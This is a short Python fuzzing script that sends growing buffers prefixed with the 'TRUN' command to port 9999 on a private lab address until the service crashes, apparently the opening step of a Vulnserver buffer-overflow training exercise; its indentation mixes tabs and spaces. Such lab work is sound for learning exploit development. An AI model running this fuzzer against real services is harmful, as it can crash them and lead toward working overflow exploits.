#!/usr/bin/python
import sys, socket
from time import sleep

buffer = "A" * 100

while True:
	try:
                payload = "TRUN /.:/" + buffer

		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect(('192.168.187.128',9999))
                print("[+] Sending the payload....\n" + str(len(buffer)))
                
		s.send((payload.encode()))
		s.close()
		sleep(1)
		buffer = buffer + "A"*100
	
	except: 
		print ("Fuzzing Crashed At %s Bytes" % str(len(buffer)))
		sys.exit()
